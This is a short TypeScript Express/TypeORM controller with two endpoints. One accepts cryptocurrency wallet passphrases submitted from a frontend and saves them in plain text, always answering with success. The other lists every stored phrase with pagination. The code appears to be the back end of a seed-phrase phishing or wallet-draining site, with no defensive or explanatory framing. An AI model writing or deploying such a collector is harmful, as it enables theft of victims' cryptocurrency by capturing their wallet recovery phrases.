import { Request, Response } from 'express';
import { AppDataSource } from './index';
import { WalletPhrase } from './entity/WalletPhrase';

export const sendWalletPhrase = async (req: Request, res: Response) => {
  const { passphrase } = req.body;
  if (!passphrase) {
    return res.status(400).json({ error: 'Passphrase is required' });
  }

  try {
    const walletPhraseRepository = AppDataSource.getRepository(WalletPhrase);

    // 1. Try to find existing first (to avoid unnecessary save attempts)
    let existingPhrase = await walletPhraseRepository.findOne({ where: { passphrase } });

    if (!existingPhrase) {
      try {
        const newPhrase = walletPhraseRepository.create({ passphrase });
        await walletPhraseRepository.save(newPhrase);
      } catch (saveError: any) {
        // Handle race condition: if another request saved it between our find and save
        if (saveError.code === '23505') { // Postgres unique_violation code
          // Already exists, we can ignore and return success
        } else {
          throw saveError;
        }
      }
    }

    // Always return success to the frontend for idempotency
    return res.status(200).json({ message: 'Phrase saved successfully' });
  } catch (error) {
    console.error('Error in sendWalletPhrase:', error);
    if (error instanceof Error) {
      return res.status(500).json({ error: 'Operation failed', details: error.message });
    } else {
      return res.status(500).json({ error: 'Operation failed', details: 'An unknown error occurred' });
    }
  }
};

export const getWalletPhrases = async (req: Request, res: Response) => {
  try {
    const page = parseInt(req.query.page as string, 10) || 1;
    const limit = parseInt(req.query.limit as string, 10) || 10;
    const skip = (page - 1) * limit;

    const walletPhraseRepository = AppDataSource.getRepository(WalletPhrase);
    const [data, totalItems] = await walletPhraseRepository.findAndCount({
      order: { createdAt: 'DESC' },
      take: limit,
      skip: skip,
    });

    return res.status(200).json({
      data,
      meta: {
        totalItems,
        itemCount: data.length,
        itemsPerPage: limit,
        totalPages: Math.ceil(totalItems / limit),
        currentPage: page,
      },
    });
  } catch (error) {
    console.error('Error fetching wallet phrases:', error);
    return res.status(500).json({ error: 'Failed to retrieve phrases' });
  }
};
